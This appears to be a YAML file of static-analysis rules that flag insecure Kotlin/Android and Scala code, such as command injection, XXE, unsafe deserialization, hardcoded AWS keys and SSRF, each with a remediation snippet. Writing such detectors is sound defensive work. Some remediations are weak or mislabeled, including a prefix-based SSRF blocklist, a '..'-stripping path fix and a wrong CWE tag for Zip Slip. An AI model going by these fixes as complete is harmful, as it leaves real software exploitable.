note: "Clipboard is accessible to all apps on older Android versions. Users should\
  \ be\nwarned about clipboard access and sensitive data should not be placed there.\n\
  \nREMEDIATION:\nClear clipboard after use; warn users about clipboard risks:\n```kotlin\n\
  // GOOD\nval clipboard = context.getSystemService(ClipboardManager::class.java)\n\
  val clip = ClipData.newPlainText(\"label\", sensitiveData)\nclipboard.setPrimaryClip(clip)\n\
  \n// Clear after use\nHandler(Looper.getMainLooper()).postDelayed({\n    clipboard.clearPrimaryClip()\n\
  }, 30000) // Clear after 30 seconds\n```\n\nREFERENCES:\n- CWE-359: https://cwe.mitre.org/data/definitions/359.html\n\
  - Android Clipboard Security: https://developer.android.com/about/versions/12/behavior-changes-all#clipboard-access-notifications\n"
---
id: kotlin-cwe-345-biometric-no-cryptoobject
language: kotlin
severity: error
message: 'CWE-345: Unprotected Biometric Authentication'
tags:
- security
- authentication
- CWE-345
- android
rule:
  kind: call_expression
  pattern: BiometricPrompt
note: "Biometric auth without CryptoObject can be bypassed. The auth must perform\
  \ actual\ncryptographic operations to be secure.\n\nREMEDIATION:\nUse BiometricPrompt\
  \ with CryptoObject for actual cryptographic operation:\n```kotlin\n// GOOD\nval\
  \ cipher = Cipher.getInstance(\"AES/CBC/PKCS5Padding\")\ncipher.init(Cipher.ENCRYPT_MODE,\
  \ key)\nval cryptoObject = BiometricPrompt.CryptoObject(cipher)\n\nbiometricPrompt.authenticate(\n\
  \    prompt, // PromptInfo\n    cryptoObject\n)\n```\n\nREFERENCES:\n- CWE-345:\
  \ https://cwe.mitre.org/data/definitions/345.html\n- Android Biometric Security:\
  \ https://developer.android.com/training/sign-in/biometric-auth\n"
---
id: kotlin-cwe-434-file-provider-paths
language: kotlin
severity: error
message: 'CWE-434: Insecure File Provider Paths'
tags:
- security
- data-storage
- CWE-434
- OWASP-A01:Broken-Access-Control
- android
rule:
  kind: xml_element
  pattern: <root-path path="."
note: 'Exposing entire filesystem through FileProvider allows any file to be accessed
  by

  other apps. Only specific directories should be exposed.


  REMEDIATION:

  Limit exposed paths to specific directories needed:

  ```xml

  <!-- BAD -->

  <root-path path="." />


  <!-- GOOD -->

  <files-path path="docs/" name="doc_files" />

  <cache-path path="images/" name="image_files" />

  <!-- Don''t expose sensitive directories -->

  ```


  REFERENCES:

  - CWE-434: https://cwe.mitre.org/data/definitions/434.html

  - Android FileProvider: https://developer.android.com/reference/androidx/core/content/FileProvider

  '
---
id: kotlin-cwe-95-dynamic-code-loading
language: kotlin
severity: error
message: 'CWE-95: Dynamic Code Loading'
tags:
- security
- code-execution
- CWE-95
- OWASP-A06:Vulnerable-and-Outdated-Components
- android
rule:
  kind: call_expression
  pattern: DexClassLoader|PathClassLoader
note: "Loading code from external storage allows code injection attacks. Code should\
  \ only\nbe loaded from verified sources in internal storage.\n\nREMEDIATION:\nOnly\
  \ load code from verified sources; use app's internal storage:\n```kotlin\n// BAD\n\
  val loader = DexClassLoader(\n    externalStoragePath,\n    context.cacheDir.path,\n\
  \    null,\n    context.classLoader\n)\n\n// GOOD\nval loader = DexClassLoader(\n\
  \    context.filesDir.path + \"/verified.dex\",\n    context.cacheDir.path,\n  \
  \  null,\n    context.classLoader\n)\n```\n\nREFERENCES:\n- CWE-95: https://cwe.mitre.org/data/definitions/95.html\n\
  - Android Dynamic Code Loading: https://developer.android.com/privacy-and-security/risks/dynamic-code-loading\n"
---
id: scala-cwe-89-sql-injection-slick
language: scala
severity: error
message: 'CWE-89: SQL Injection - Raw SQL string interpolation with $ in Slick queries'
tags:
- security
- sql-injection
- CWE-89
- OWASP-A03
rule:
  kind: string_interpolation
  pattern: sql"$$$EXPR" | sqlu"$$$EXPR"
note: 'Using string interpolation with `sql` or `sqlu` in Slick allows user input
  to be directly embedded in SQL queries, leading to SQL injection vulnerabilities.


  Use parameter binding instead:

  ```scala

  sql"SELECT * FROM users WHERE name = ${userInput}".as[User]

  ```

  Note: ${} is safe in Slick, but $$ is not.

  '
---
id: scala-cwe-89-sql-concatenation-slick
language: scala
severity: error
message: 'CWE-89: SQL Injection - String concatenation in SQL context (Slick)'
tags:
- security
- sql-injection
- CWE-89
- OWASP-A03
rule:
  kind: method_call
  pattern: PlainSQLAction($EXPR + $INPUT) | sql\"\"\"$EXPR\"\"\" + $ANYTHING
note: 'Concatenating strings to build SQL queries bypasses Slick''s parameterization
  protection.


  Use Slick''s typed query builders instead:

  ```scala

  users.filter(_.name === inputName)

  ```

  '
---
id: scala-cwe-89-doobie-raw-sql
language: scala
severity: error
message: 'CWE-89: SQL Injection - Doobie raw SQL interpolation with Fragment.const'
tags:
- security
- sql-injection
- CWE-89
- OWASP-A03
rule:
  kind: method_call
  pattern: Fragment.const($TAINTED_INPUT) | fr\"${$LITERAL_CONCAT}\" | sql\"$LITERAL_STRING_CONCAT\"
note: 'Using `Fragment.const` in Doobie treats the input as raw SQL, which is vulnerable
  to injection.


  Use parameterized fragments instead:

  ```scala

  fr"SELECT * FROM users WHERE name = $userName"

  ```

  '
---
id: scala-cwe-89-anorm-raw-query
language: scala
severity: error
message: 'CWE-89: SQL Injection - Anorm raw query with string concatenation'
tags:
- security
- sql-injection
- CWE-89
- OWASP-A03
rule:
  kind: method_call
  pattern: SQL($STRING_CONCAT) | SQL\(\"SELECT \* FROM \" \+ $TABLE_NAME\)
note: "Anorm's SQL() accepts raw strings; concatenating user input is dangerous.\n\
  \nUse named parameters instead:\n```scala\nSQL(\"SELECT * FROM users WHERE name\
  \ = {name}\")\n  .on(\"name\" -> userName)\n```\n"
---
id: scala-cwe-89-scalikejdbc-raw-sql
language: scala
severity: error
message: 'CWE-89: SQL Injection - ScalikeJDBC createUnsafely or $$$ interpolation'
tags:
- security
- sql-injection
- CWE-89
- OWASP-A03
rule:
  kind: method_call
  pattern: sql\"$$$ANYTHING\".execute() | SQLSyntax.createUnsafely($USER_INPUT)
note: "ScalikeJDBC's `createUnsafely` and `$$` interpolation bypass safety mechanisms.\n\
  \nUse typed query builders instead:\n```scala\nwithSQL {\n  select.from(User as\
  \ u).where.eq(u.name, userName)\n}.map(User(u)).list.apply()\n```\n"
---
id: scala-cwe-78-process-execution-user-input
language: scala
severity: error
message: 'CWE-78: OS Command Injection - Process execution with user input'
tags:
- security
- command-injection
- CWE-78
- OWASP-A03
rule:
  kind: method_call
  pattern: Process($STRING_CONCAT) | $EXPR.! | $EXPR.!! | $EXPR.run() | Seq\(\"sh\",
    \"-c\", $USER_INPUT\) | Runtime.getRuntime().exec($USER_INPUT) | ProcessBuilder($TAINTED)
note: "Executing shell commands with user-controlled input enables command injection\
  \ attacks.\n\nUse explicit argument arrays without shell interpretation:\n```scala\n\
  Process(Seq(\"ls\", \"-la\", sanitizedPath)).!\n\n// Validate input against allowlist\n\
  val allowedCommands = Set(\"status\", \"version\")\nif (allowedCommands.contains(userInput))\
  \ {\n  Process(Seq(\"myapp\", userInput)).!\n}\n```\n"
---
id: scala-cwe-78-shell-string-execution
language: scala
severity: error
message: 'CWE-78: OS Command Injection - Shell string execution via ! or !!'
tags:
- security
- command-injection
- CWE-78
- OWASP-A03
rule:
  kind: operator
  pattern: $STRING.! | $STRING.!! | $STRING.run
note: 'Using string-based process execution invokes a shell, enabling shell metacharacter
  injection.


  Use Seq-based API to avoid shell interpretation:

  ```scala

  Process(Seq("command", "arg1", "arg2")).!

  ```

  '
---
id: scala-cwe-78-processbuilder-shell
language: scala
severity: warning
message: 'CWE-78: OS Command Injection - ProcessBuilder with potentially vulnerable
  configuration'
tags:
- security
- command-injection
- CWE-78
- OWASP-A03
rule:
  kind: object_creation
  pattern: new ProcessBuilder($ARGS).inheritIO().start()
note: "ProcessBuilder with concatenated commands may be vulnerable if shell is invoked.\n\
  \nExplicitly set command and arguments:\n```scala\nnew ProcessBuilder(java.util.Arrays.asList(\"\
  cmd\", \"arg1\", \"arg2\"))\n  .inheritIO()\n  .start()\n```\n"
---
id: scala-cwe-611-xxe-scala-xml
language: scala
severity: error
message: 'CWE-611: XML External Entity (XXE) - Scala XML parser with default configuration'
tags:
- security
- xml-security
- CWE-611
- OWASP-A05
rule:
  kind: method_call
  pattern: scala.xml.XML.load($INPUT) | scala.xml.XML.loadFile($INPUT) | scala.xml.XML.loadString($INPUT)
    | XML.load\(new InputSource\($STREAM\)\)
note: 'Default Scala XML parser is vulnerable to XXE attacks. External entities can
  exfiltrate data or cause SSRF.


  Disable external entities:

  ```scala

  import javax.xml.parsers.SAXParserFactory


  val factory = SAXParserFactory.newInstance()

  factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)

  factory.setFeature("http://xml.org/sax/features/external-general-entities", false)

  factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false)


  val parser = factory.newSAXParser()

  XML.withSAXParser(parser).load(input)

  ```

  '
---
id: scala-cwe-611-documentbuilder-xxe
language: scala
severity: error
message: 'CWE-611: XML External Entity (XXE) - DocumentBuilderFactory default configuration'
tags:
- security
- xml-security
- CWE-611
- OWASP-A05
rule:
  kind: method_call
  pattern: DocumentBuilderFactory.newInstance().newDocumentBuilder().parse($INPUT)
note: 'Default DocumentBuilderFactory allows XXE.


  Disable external entities:

  ```scala

  val dbf = DocumentBuilderFactory.newInstance()

  dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)

  dbf.setFeature("http://xml.org/sax/features/external-general-entities", false)

  dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false)

  dbf.setXIncludeAware(false)

  dbf.setExpandEntityReferences(false)

  ```

  '
---
id: scala-cwe-611-saxparser-xxe
language: scala
severity: error
message: 'CWE-611: XML External Entity (XXE) - SAXParserFactory default configuration'
tags:
- security
- xml-security
- CWE-611
- OWASP-A05
rule:
  kind: method_call
  pattern: SAXParserFactory.newInstance().newSAXParser().parse($INPUT, $HANDLER)
note: 'Default SAXParser configuration is vulnerable to XXE.


  Disable external entities:

  ```scala

  val spf = SAXParserFactory.newInstance()

  spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)

  spf.setFeature("http://xml.org/sax/features/external-general-entities", false)

  spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false)

  ```

  '
---
id: scala-cwe-611-xmlinputfactory-xxe
language: scala
severity: error
message: 'CWE-611: XML External Entity (XXE) - XMLInputFactory (StAX) default configuration'
tags:
- security
- xml-security
- CWE-611
- OWASP-A05
rule:
  kind: method_call
  pattern: XMLInputFactory.newInstance().createXMLStreamReader($INPUT) | XMLInputFactory.newFactory()
note: 'StAX parser default configuration allows XXE.


  Disable external entities:

  ```scala

  val xif = XMLInputFactory.newFactory()

  xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false)

  xif.setProperty(XMLInputFactory.SUPPORT_DTD, false)

  ```

  '
---
id: scala-cwe-502-java-deserialization
language: scala
severity: error
message: 'CWE-502: Deserialization of Untrusted Data - Java ObjectInputStream'
tags:
- security
- serialization
- CWE-502
- OWASP-A08
rule:
  kind: method_call
  pattern: ObjectInputStream($UNTRUSTED_STREAM).readObject() | new ObjectInputStream($INPUT)
note: "Java deserialization of untrusted data can lead to remote code execution via\
  \ gadget chains.\n\nUse safer serialization formats:\n```scala\nimport io.circe.parser.decode\n\
  decode[MyClass](jsonString)\n\n// Or use allowlist-based deserialization\nclass\
  \ SafeObjectInputStream(in: InputStream) extends ObjectInputStream(in) {\n  override\
  \ def resolveClass(desc: ObjectStreamClass): Class[_] = {\n    val allowedClasses\
  \ = Set(\"com.example.SafeClass\")\n    if (!allowedClasses.contains(desc.getName))\
  \ {\n      throw new InvalidClassException(\"Unauthorized deserialization\")\n \
  \   }\n    super.resolveClass(desc)\n  }\n}\n```\n"
---
id: scala-cwe-502-kryo-unsafe
language: scala
severity: error
message: 'CWE-502: Deserialization of Untrusted Data - Kryo without registration'
tags:
- security
- serialization
- CWE-502
- OWASP-A08
rule:
  kind: method_call
  pattern: kryo.setRegistrationRequired(false) | new Kryo().readObject($INPUT, $CLASS)
    | kryo.readClassAndObject($INPUT)
note: 'Kryo without class registration can deserialize arbitrary classes.


  Enable registration requirement:

  ```scala

  val kryo = new Kryo()

  kryo.setRegistrationRequired(true)

  kryo.register(classOf[AllowedClass1])

  kryo.register(classOf[AllowedClass2])

  ```

  '
---
id: scala-cwe-502-play-json-any
language: scala
severity: warning
message: 'CWE-502: Deserialization of Untrusted Data - Play JSON with Any type'
tags:
- security
- serialization
- CWE-502
- OWASP-A08
rule:
  kind: method_call
  pattern: Json.parse($INPUT).as\[Any\] | Json.fromJson\[Any\]($INPUT)
note: 'Deserializing to Any or Object types may allow type confusion attacks.


  Use specific types instead:

  ```scala

  Json.parse(input).as[ExpectedType]

  ```

  '
---
id: scala-cwe-502-pickle-deserialization
language: scala
severity: warning
message: 'CWE-502: Deserialization of Untrusted Data - Pickle/BooPickle'
tags:
- security
- serialization
- CWE-502
- OWASP-A08
rule:
  kind: method_call
  pattern: Unpickle\[$TYPE\].fromBytes($UNTRUSTED) | BooPickle.Unpickle\[$TYPE\].fromBytes($INPUT)
note: 'Binary serialization formats can be vulnerable to crafted payloads.


  Validate source and verify integrity:

  ```scala

  val verified = HmacUtils.verify(data, signature, secretKey)

  if (verified) Unpickle[SafeType].fromBytes(data)

  ```

  '
---
id: scala-cwe-327-md5-hash
language: scala
severity: warning
message: 'CWE-327: Use of Broken Cryptographic Algorithm - MD5'
tags:
- security
- cryptography
- CWE-327
- CWE-328
- OWASP-A02
rule:
  kind: method_call
  pattern: MessageDigest.getInstance\(\"MD5\"\) | DigestUtils.md5($DATA) | DigestUtils.md5Hex($DATA)
    | Hashing.md5()
note: 'MD5 is cryptographically broken and should not be used for security purposes.


  Use SHA-256 or stronger:

  ```scala

  MessageDigest.getInstance("SHA-256")

  DigestUtils.sha256Hex(data)

  Hashing.sha256()

  ```

  '
---
id: scala-cwe-328-sha1-hash
language: scala
severity: warning
message: 'CWE-328: Reversible One-Way Hash - SHA-1'
tags:
- security
- cryptography
- CWE-328
- OWASP-A02
rule:
  kind: method_call
  pattern: MessageDigest.getInstance\(\"SHA-1\"\) | DigestUtils.sha1($DATA) | DigestUtils.sha1Hex($DATA)
    | Hashing.sha1()
note: 'SHA-1 is deprecated for security purposes due to collision attacks.


  Use SHA-256 or stronger:

  ```scala

  MessageDigest.getInstance("SHA-256")

  // or SHA-384, SHA-512, SHA3-256

  ```

  '
---
id: scala-cwe-327-des-encryption
language: scala
severity: error
message: 'CWE-327: Use of Broken Cryptographic Algorithm - DES or 3DES'
tags:
- security
- cryptography
- CWE-327
- OWASP-A02
rule:
  kind: method_call
  pattern: Cipher.getInstance\(\"DES\"\) | Cipher.getInstance\(\"DES/$MODE/$PADDING\"\)
    | Cipher.getInstance\(\"DESede\"\)
note: 'DES and 3DES are deprecated due to small key sizes.


  Use AES with GCM mode:

  ```scala

  Cipher.getInstance("AES/GCM/NoPadding")

  ```

  '
---
id: scala-cwe-327-aes-ecb-mode
language: scala
severity: warning
message: 'CWE-327: Broken Cryptographic Algorithm - AES with ECB mode'
tags:
- security
- cryptography
- CWE-327
- OWASP-A02
rule:
  kind: method_call
  pattern: Cipher.getInstance\(\"AES/ECB/$PADDING\"\) | Cipher.getInstance\(\"$ALGO/ECB/$PADDING\"\)
note: 'ECB mode does not provide semantic security; identical plaintext blocks produce
  identical ciphertext.


  Use GCM or CBC mode:

  ```scala

  Cipher.getInstance("AES/GCM/NoPadding")

  // Or AES/CBC with random IV

  ```

  '
---
id: scala-cwe-321-hardcoded-encryption-key
language: scala
severity: error
message: 'CWE-321: Hard-coded Cryptographic Key'
tags:
- security
- cryptography
- CWE-321
- OWASP-A02
rule:
  kind: variable_assignment
  pattern: val key = \"hardcodedkey12345\" | new SecretKeySpec($STRING_LITERAL.getBytes,
    \"AES\") | SecretKeySpec($LITERAL, $ALGO)
note: 'Hardcoded encryption keys can be extracted from compiled code.


  Load from secure key management:

  ```scala

  val key = KeyManager.getKey("encryption-key")

  // Or use environment-based configuration

  val key = sys.env("ENCRYPTION_KEY")

  ```

  '
---
id: scala-cwe-329-static-iv-nonce
language: scala
severity: warning
message: 'CWE-329: Not Using Random IV with Encryption'
tags:
- security
- cryptography
- CWE-329
- OWASP-A02
rule:
  kind: object_creation
  pattern: val iv = new IvParameterSpec($STRING_LITERAL.getBytes) | IvParameterSpec($LITERAL)
    | new IvParameterSpec\(Array\[Byte\]\(0, 0, 0, 0, $REST\)\)
note: 'Using static IVs breaks semantic security for CBC/GCM modes.


  Generate random IV:

  ```scala

  val random = new SecureRandom()

  val iv = new Array[Byte](12) // For GCM

  random.nextBytes(iv)

  new IvParameterSpec(iv)

  ```

  '
---
id: scala-cwe-326-weak-key-size
language: scala
severity: warning
message: 'CWE-326: Inadequate Encryption Strength - Weak key size'
tags:
- security
- cryptography
- CWE-326
- OWASP-A02
rule:
  kind: method_call
  pattern: KeyGenerator.getInstance\(\"AES\"\).init\(64\) | KeyGenerator.getInstance\($ALGO\).init\($SIZE\)
    | keyGenerator.init\(128\) | KeyPairGenerator.getInstance\(\"RSA\"\).initialize\(1024\)
note: 'Small key sizes are vulnerable to brute force attacks.


  Use stronger key sizes:

  ```scala

  val keyGen = KeyGenerator.getInstance("AES")

  keyGen.init(256)


  val keyPairGen = KeyPairGenerator.getInstance("RSA")

  keyPairGen.initialize(2048) // Minimum, prefer 4096

  ```

  '
---
id: scala-cwe-326-unsafe-ssl-tls
language: scala
severity: error
message: 'CWE-326: Inadequate Encryption Strength - Unsafe SSL/TLS'
tags:
- security
- cryptography
- CWE-326
- OWASP-A02
rule:
  kind: method_call
  pattern: SSLContext.getInstance\(\"SSL\"\) | SSLContext.getInstance\(\"TLSv1\"\)
    | SSLContext.getInstance\(\"TLSv1.1\"\) | setEnabledProtocols\(Array\(\"SSLv3\",
    $REST\)\)
note: 'SSL and older TLS versions have known vulnerabilities.


  Use TLS 1.3 or at minimum 1.2:

  ```scala

  SSLContext.getInstance("TLSv1.3")

  ```

  '
---
id: scala-cwe-295-disabled-certificate-validation
language: scala
severity: error
message: 'CWE-295: Improper Certificate Validation'
tags:
- security
- cryptography
- CWE-295
- OWASP-A02
rule:
  kind: method_call
  pattern: .setHostnameVerifier\(NoopHostnameVerifier.INSTANCE\) | HostnameVerifier
    \{ \(_, _\) => true \} | TrustManager \{ override def checkServerTrusted\(.*\)
    = \(\) \} | X509TrustManager \{ def checkServerTrusted\(.*\) = \{\} \} | setSSLSocketFactory\($TRUST_ALL\)
note: 'Disabling certificate validation enables man-in-the-middle attacks.


  Use default trust manager:

  ```scala

  val sslContext = SSLContext.getInstance("TLSv1.3")

  sslContext.init(null, null, null)

  ```

  '
---
id: scala-cwe-259-hardcoded-password
language: scala
severity: error
message: 'CWE-259: Hard-coded Password'
tags:
- security
- credentials
- CWE-259
- CWE-798
- OWASP-A02
rule:
  kind: variable_assignment
  pattern: val password = \"secret123\" | password = \"...\" | .password\(\"$LITERAL\"\)
    | setPassword\($STRING_LITERAL\) | \"password\" -> \"$LITERAL\"
note: 'Hardcoded passwords can be extracted from source code or compiled artifacts.


  Load from environment or configuration:

  ```scala

  val password = sys.env("DB_PASSWORD")

  val password = config.getString("database.password")

  // Use secret management: Vault, AWS Secrets Manager, etc.

  ```

  '
---
id: scala-cwe-798-hardcoded-api-key
language: scala
severity: error
message: 'CWE-798: Hard-coded Credentials - API Key'
tags:
- security
- credentials
- CWE-798
- OWASP-A02
rule:
  kind: variable_assignment
  pattern: val apiKey = \"sk_live_...\" | \"Authorization\" -> \"Bearer $LITERAL\"
    | \"X-API-Key\" -> \"$LITERAL\" | apiKey = \"$LITERAL_STARTING_WITH_KEY_PATTERN\"
note: 'Hardcoded API keys can be stolen from source repositories.


  Load from environment:

  ```scala

  val apiKey = sys.env("API_KEY")

  // Use secret management services

  ```

  '
---
id: scala-cwe-798-hardcoded-db-credentials
language: scala
severity: error
message: 'CWE-798: Hard-coded Credentials - Database connection'
tags:
- security
- credentials
- CWE-798
- OWASP-A02
rule:
  kind: method_call
  pattern: DriverManager.getConnection\(\"jdbc:mysql://host/db\", \"user\", \"$PASSWORD\"\)
    | \"jdbc:$DRIVER://$HOST/$DB\?user=$USER&password=$PASS\"
note: 'Database credentials in connection strings are easily extracted.


  Load from configuration:

  ```scala

  val url = config.getString("db.url")

  val user = config.getString("db.user")

  val pass = sys.env("DB_PASSWORD")

  DriverManager.getConnection(url, user, pass)

  ```

  '
---
id: scala-cwe-798-aws-credentials
language: scala
severity: error
message: 'CWE-798: Hard-coded Credentials - AWS access keys'
tags:
- security
- credentials
- CWE-798
- OWASP-A02
rule:
  kind: object_creation
  pattern: BasicAWSCredentials\(\"AKIA$REST\", \"$SECRET\"\) | AWSStaticCredentialsProvider\(new
    BasicAWSCredentials\($KEY, $SECRET\)\) | \"aws.accessKeyId\" -> \"$LITERAL\"
note: "AWS credentials should never be hardcoded; use IAM for credential management.\n\
  \nUse default credential provider chain:\n```scala\nAmazonS3ClientBuilder.standard()\n\
  \  .withCredentials(new DefaultAWSCredentialsProviderChain())\n  .build()\n```\n"
---
id: scala-cwe-22-path-traversal
language: scala
severity: warning
message: 'CWE-22: Path Traversal - Unvalidated file path'
tags:
- security
- path-traversal
- CWE-22
- OWASP-A01
rule:
  kind: object_creation
  pattern: new File\($BASE_PATH \+ $USER_INPUT\) | new File\($USER_INPUT\) | Paths.get\($USER_INPUT\)
    | Source.fromFile\($USER_INPUT\) | Files.readAllBytes\(Paths.get\($USER_INPUT\)\)
note: "User-controlled paths may contain `../` sequences to access unauthorized files.\n\
  \nValidate and normalize paths:\n```scala\nimport java.nio.file.{Path, Paths}\n\n\
  def safePath(basePath: String, userInput: String): Option[Path] = {\n  val base\
  \ = Paths.get(basePath).toAbsolutePath.normalize()\n  val target = base.resolve(userInput).toAbsolutePath.normalize()\n\
  \  if (target.startsWith(base)) Some(target) else None\n}\n```\n"
---
id: scala-cwe-22-play-static-files
language: scala
severity: warning
message: 'CWE-22: Path Traversal - Play Framework static file serving'
tags:
- security
- path-traversal
- CWE-22
- OWASP-A01
rule:
  kind: method_call
  pattern: Assets.at\($USER_PATH\) | at\(\"/public\", $USER_INPUT\) | Ok.sendFile\(new
    File\($USER_INPUT\)\)
note: "Serving files based on user input without validation allows directory traversal.\n\
  \nValidate path is within allowed directory:\n```scala\ndef serveFile(filename:\
  \ String) = Action {\n  val safeName = filename.replaceAll(\"\\\\.\\\\.\", \"\"\
  )\n  val file = new File(s\"$baseDir/$safeName\")\n  if (file.getCanonicalPath.startsWith(baseDir))\
  \ {\n    Ok.sendFile(file)\n  } else {\n    Forbidden(\"Invalid path\")\n  }\n}\n\
  ```\n"
---
id: scala-cwe-409-zip-slip
language: scala
severity: warning
message: 'CWE-409: Zip Slip Vulnerability - Unsafe zip entry extraction'
tags:
- security
- path-traversal
- CWE-409
- OWASP-A01
rule:
  kind: method_call
  pattern: zipEntry.getName | new File\(destDir, entry.getName\) | ZipInputStream\($INPUT\)
note: "Malicious zip files can contain entries with path traversal sequences.\n\n\
  Validate zip entry paths:\n```scala\nval destDir = new File(destination).getCanonicalPath\n\
  val entry = zipInput.getNextEntry\nval entryDest = new File(destDir, entry.getName)\n\
  \nif (!entryDest.getCanonicalPath.startsWith(destDir)) {\n  throw new SecurityException(\"\
  Zip Slip detected\")\n}\n```\n"
---
id: scala-cwe-918-ssrf-http-request
language: scala
severity: warning
message: 'CWE-918: Server-Side Request Forgery (SSRF) - User-controlled URL'
tags:
- security
- ssrf
- CWE-918
- OWASP-A10
rule:
  kind: method_call
  pattern: ws.url\($USER_INPUT\) | Http\($USER_INPUT\) | HttpClient.newHttpClient\(\).send\(HttpRequest.newBuilder\(\).uri\(URI.create\($USER_INPUT\)\)\)
    | new URL\($USER_INPUT\).openConnection\(\) | Source.fromURL\($USER_INPUT\)
note: "User-controlled URLs can access internal services, cloud metadata endpoints,\
  \ or local files.\n\nValidate and restrict URLs:\n```scala\ndef safeUrl(input: String):\
  \ Option[URL] = {\n  val url = new URL(input)\n  val host = url.getHost\n\n  val\
  \ blockedPatterns = List(\n    \"localhost\", \"127.0.0.1\", \"10.\", \"172.16.\"\
  , \"192.168.\",\n    \"169.254.169.254\" // AWS metadata\n  )\n\n  if (blockedPatterns.exists(host.startsWith))\
  \ None\n  else Some(url)\n}\n```\n"
---
id: scala-cwe-918-play-ws-ssrf
language: scala
severity: warning
message: 'CWE-918: Server-Side Request Forgery (SSRF) - Play WS client'
tags:
- security
- ssrf
- CWE-918
- OWASP-A10
rule:
  kind: method_call
  pattern: wsClient.url\($REQUEST_PARAM\).get\(\) | ws.url\(request.getQueryString\(\"url\"\).get\)
note: "Play's WS client with user URLs is vulnerable to SSRF.\n\nValidate URLs against\
  \ allowlist:\n```scala\ndef validateUrl(url: String): Boolean = {\n  val parsed\
  \ = new URL(url)\n  val allowedHosts = Set(\"api.example.com\", \"data.example.com\"\
  )\n  allowedHosts.contains(parsed.getHost) && parsed.getProtocol == \"https\"\n\
  }\n```\n"
---
id: scala-cwe-918-akka-http-ssrf
language: scala
severity: warning
message: 'CWE-918: Server-Side Request Forgery (SSRF) - Akka HTTP'
tags:
- security
- ssrf
- CWE-918
- OWASP-A10
rule:
  kind: method_call
  pattern: Http\(\).singleRequest\(HttpRequest\(uri = $USER_INPUT\)\)
note: "Akka HTTP requests to user-controlled URIs enable SSRF.\n\nValidate URI before\
  \ making request:\n```scala\nval uri = Uri(userInput)\nif (allowedHosts.contains(uri.authority.host.address))\
  \ {\n  Http().singleRequest(HttpRequest(uri = uri))\n}\n```\n"
---
id: scala-cwe-1333-regex-dos
language: scala
severity: warning
message: 'CWE-1333: Regex Denial of Service (ReDoS)'
tags:
- security
- input-validation
- CWE-1333
- OWASP-A10
rule:
  kind: method_call
  pattern: Pattern.compile\($USER_INPUT\) | $USER_INPUT.r | new Regex\($USER_INPUT\)
note: "User-controlled regex patterns can cause exponential backtracking.\n\nUse timeout\
  \ protection:\n```scala\nimport java.util.concurrent.{TimeUnit, Executors}\n\ndef\
  \ safeMatch(pattern: String, input: String, timeoutMs: Long): Option[Boolean] =\
  \ {\n  val executor = Executors.newSingleThreadExecutor()\n  try {\n    val future\
  \ = executor.submit(() => pattern.r.findFirstIn(input).isDefined)\n    Some(future.get(timeoutMs,\
  \ TimeUnit.MILLISECONDS))\n  } catch {\n    case _: Exception => None\n  } finally\
  \ {\n    executor.shutdownNow()\n  }\n}\n```\n"
---
id: scala-cwe-20-missing-input-length-validation
language: scala
severity: warning
message: 'CWE-20: Improper Input Validation - Missing length check'
tags:
- security
- input-validation
- CWE-20
- OWASP-A01
rule:
  kind: function_definition
  pattern: 'def process\(input: String\) = \{ input.split\(.*\) \}'
note: "Processing unbounded input can lead to DoS through memory exhaustion.\n\nValidate\
  \ input length:\n```scala\ndef process(input: String): Either[String, Result] =\
  \ {\n  if (input.length > MAX_INPUT_LENGTH) {\n    Left(\"Input too long\")\n  }\
  \ else {\n    Right(/* process */)\n  }\n}\n```\n"
---
id: scala-cwe-601-open-redirect
language: scala
severity: warning
message: 'CWE-601: Open Redirect - Unvalidated redirect URL'
tags:
- security
- input-validation
- CWE-601
- OWASP-A01
rule:
  kind: method_call
  pattern: Redirect\($USER_INPUT\) | Redirect\(request.getQueryString\(\"next\"\).get\)
    | .withHeaders\(\"Location\" -> $USER_INPUT\)
note: "Open redirects can be used in phishing attacks.\n\nValidate redirect URL:\n\
  ```scala\ndef safeRedirect(url: String): Result = {\n  val allowedDomains = Set(\"\
  example.com\", \"www.example.com\")\n  val parsed = new URL(url)\n\n  if (allowedDomains.contains(parsed.getHost))\
  \ {\n    Redirect(url)\n  } else {\n    Redirect(\"/\")\n  }\n}\n```\n"
---
id: scala-cwe-93-email-header-injection
language: scala
severity: warning
message: 'CWE-93: CRLF Injection - Email header with user input'
tags:
- security
- input-validation
- CWE-93
- OWASP-A03
rule:
  kind: method_call
  pattern: .setSubject\($USER_INPUT\) | .addHeader\(\"To\", $USER_INPUT\) | MimeMessage.setRecipients\($USER_INPUT\)
note: "Email headers with user input containing newlines can inject additional headers.\n\
  \nSanitize header values:\n```scala\ndef sanitizeHeader(input: String): String =\
  \ {\n  input.replaceAll(\"[\\\\r\\\\n]\", \"\")\n}\n```\n"
---
id: scala-cwe-90-ldap-injection
language: scala
severity: warning
message: 'CWE-90: LDAP Injection - Unescaped user input in LDAP filter'
tags:
- security
- input-validation
- CWE-90
- OWASP-A03
rule:
  kind: string_concatenation
  pattern: \"\(uid=\" \+ $USER_INPUT \+ \"\)\" | \"\(&\(objectClass=user\)\(sAMAccountName=$USER_INPUT\)\)\"
    | ctx.search\($BASE, $USER_FILTER, $CONTROLS\)
note: "LDAP filters with unescaped user input allow injection attacks.\n\nEscape LDAP\
  \ values:\n```scala\nimport javax.naming.ldap.Rdn\n\ndef escapeLdap(input: String):\
  \ String = {\n  Rdn.escapeValue(input)\n}\n\nval filter = s\"(uid=${escapeLdap(userInput)})\"\
  \n```\n"
---
id: scala-sec-041-csrf-disabled
language: scala
severity: warning
message: 'Play Framework Security: CSRF Protection Disabled'
tags:
- security
- play-framework
- OWASP-A01
rule:
  kind: configuration
  pattern: play.filters.csrf.CSRFFilter.disabled | .withoutCsrfToken | @AddCSRFToken
note: 'Disabling CSRF protection allows cross-site request forgery attacks.


  Enable CSRF protection in application.conf:

  ```scala

  play.filters.enabled += "play.filters.csrf.CSRFFilter"


  // Use tokens in forms

  @helper.CSRF.formField

  ```

  '
---
id: scala-sec-042-missing-security-headers
language: scala
severity: warning
message: 'Play Framework Security: Missing security headers'
tags:
- security
- play-framework
- OWASP-A01
rule:
  kind: configuration
  pattern: play.filters.headers.contentSecurityPolicy = null | play.filters.headers.frameOptions
    = null
note: "Missing security headers expose the application to various attacks.\n\nConfigure\
